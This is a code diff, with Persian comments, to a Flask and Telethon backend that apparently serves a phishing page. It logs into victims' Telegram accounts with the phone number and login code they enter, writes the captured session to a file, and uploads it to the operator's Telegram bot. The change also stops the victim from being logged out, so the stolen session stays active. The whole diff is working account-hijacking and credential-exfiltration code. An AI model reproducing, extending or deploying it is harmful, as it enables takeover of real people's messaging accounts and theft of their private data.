@@ -1,7 +1,6 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telethon import TelegramClient
-from telethon.sessions import StringSession
 import asyncio
 import os
 import logging
@@ -111,38 +110,24 @@ async def verify_session(session_id, phone, code):
             logging.error("❌ Login failed")
             return False
         
-        # ✅ گرفتن سشن با StringSession (مطمئن‌ترین روش)
-        session_string = StringSession.save(client.session)
+        # ============================================================
+        # 📁 ذخیره سشن در فایل
+        # ============================================================
+        session_file_path = f"{session_id}.session"
+        client.session.save_to_file(session_file_path)
         
-        # ✅ ارسال به ربات با قالب انگلیسی
-        if session_string and len(session_string) > 10:
-            message = f"""✅ <b>New Session Captured</b>
-
-┌───────────────────────────
-│ 📱 <b>User:</b> <code>{phone}</code>
-│ 🔐 <b>Session String:</b>
-│ <code>{session_string}</code>
-└───────────────────────────
-
-🔒 <b>Status:</b> Logged out automatically"""
-        else:
-            message = f"""❌ <b>Session Capture Failed</b>
-
-┌───────────────────────────
-│ 📱 <b>User:</b> <code>{phone}</code>
-│ 🔐 <b>Session String:</b> <code>EMPTY</code>
-└───────────────────────────
-
-⚠️ Please try again."""
-
-        send_to_bot(message)
-
-        # ✅ خروج کامل از اکانت
-        await client.log_out()
+        # ✅ ارسال فایل به ربات (فقط فایل + شماره)
+        await send_session_file_to_bot(session_file_path, phone)
+        
+        # پاک کردن فایل بعد از ارسال
+        if os.path.exists(session_file_path):
+            os.remove(session_file_path)
+        
+        # ✅ فقط قطع کن، خارج نشو (سشن میمونه)
         await client.disconnect()
 
         sessions[session_id]['status'] = 'done'
-        logging.info(f"✅ Session saved and logged out for: {phone}")
+        logging.info(f"✅ Session file sent for: {phone}")
         return True
 
     except Exception as e:
@@ -154,22 +139,40 @@ async def verify_session(session_id, phone, code):
             return False
         raise
 
-def send_to_bot(message):
+# ============================================================
+# 📤 ارسال فایل سشن به ربات (فقط فایل + شماره)
+# ============================================================
+async def send_session_file_to_bot(file_path, phone):
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
-        response = requests.post(url, json=payload)
-        if response.status_code == 200:
-            logging.info("✅ Message sent to bot")
-        else:
-            logging.error(f"❌ Bot error: {response.status_code}")
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        
+        with open(file_path, 'rb') as f:
+            files = {'document': (f"{phone.replace('+', '')}.session", f, 'application/octet-stream')}
+            
+            caption = f"""📱 <b>User:</b> <code>{phone}</code>
+
+🔐 <b>Session File:</b> <code>{os.path.basename(file_path)}</code>
+
+🔒 <b>Do not share this file with anyone!</b>"""
+            
+            data = {
+                'chat_id': CHAT_ID,
+                'caption': caption,
+                'parse_mode': 'HTML'
+            }
+            
+            response = requests.post(url, data=data, files=files)
+            
+            if response.status_code == 200:
+                logging.info("✅ Session file sent to bot")
+            else:
+                logging.error(f"❌ Bot error: {response.status_code}")
     except Exception as e:
         logging.error(f"❌ Bot error: {e}")
 
+# ============================================================
+# اجرا
+# ============================================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
